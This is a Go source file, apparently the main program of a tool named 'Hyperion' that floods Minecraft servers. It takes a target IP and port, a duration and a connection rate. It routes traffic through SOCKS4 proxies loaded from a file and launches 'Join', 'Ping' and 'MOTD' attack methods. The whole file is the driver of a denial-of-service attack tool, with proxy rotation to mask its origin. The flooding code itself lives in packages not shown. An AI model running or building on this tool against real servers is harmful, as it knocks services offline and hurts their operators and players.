package main

import (
	"Hyperion/core"
	"Hyperion/core/method"
	"Hyperion/core/method/methods"
	"Hyperion/core/proxy"
	"flag"
	"fmt"
	"log"
	"time"
)

var (
	ip       = flag.String("ip", "0.0.0.0", "sets ip")
	port     = flag.String("port", "25565", "sets port")
	protocol = flag.Int("protcol", 761, "sets version protocol")
	duration = flag.Int("duration", 600, "duration in sec")
	loops    = flag.Int("loops", 1, "no of loop threads")
	delay    = flag.Int("delay", 1, "delay in sec")
	perDelay = flag.Int("perdelay", 1000, "connections per delay")
)

func main() {

	flag.Parse()

	proxyManager := proxy.ProxyManager{}

	err := proxy.LoadFromFile(proxy.SOCKS4, "socks4.txt", &proxyManager)
	if err != nil {
		log.Fatal(err)
	}

	info := core.AttackInfo{
		Ip:       *ip,
		Port:     *port,
		Protocol: *protocol,
		Duration: time.Duration(*duration) * time.Second,
		Loops:    *loops,
		Delay:    time.Duration(*delay) * time.Second,
		PerDelay: *perDelay,
	}

	registerMethod(&info, &proxyManager)

	method := methods.Join{
		Info:         &info,
		ProxyManager: &proxyManager,
	}

	method.Start()

	for {
		fmt.Print("Running")
		time.Sleep(1 * time.Second)
		fmt.Print("\r")
	}
}

func registerMethod(info *core.AttackInfo, proxyManager *proxy.ProxyManager) {
	method.RegisterMethod(methods.Join{
		Info:         info,
		ProxyManager: proxyManager,
	})
	method.RegisterMethod(methods.Ping{
		Info:         info,
		ProxyManager: proxyManager,
	})
	method.RegisterMethod(methods.MOTD{
		Info:         info,
		ProxyManager: proxyManager,
	})
}
